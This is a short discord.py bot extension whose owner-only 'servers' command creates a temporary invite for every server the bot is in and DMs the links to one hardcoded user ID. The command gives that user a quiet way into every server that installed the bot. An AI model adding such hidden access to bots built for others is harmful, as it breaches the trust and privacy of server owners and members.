import discord
from discord.ext import commands

class Owner(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def servers(self, ctx):
        if ctx.author.id != 1279922447876886649:
            return

        invites = []
        for guild in self.bot.guilds:
            if guild.me.guild_permissions.create_instant_invite:
                invite = await guild.text_channels[0].create_invite(max_age=300)  # Invite lasts for 5 minutes
                invites.append(invite)

        for invite in invites:
            await ctx.author.send(f"Here's an invite link to {invite.guild.name}: {invite.url}")

        await ctx.send("I've sent you the invite links via DM.")

async def setup(bot):
    await bot.add_cog(Owner(bot))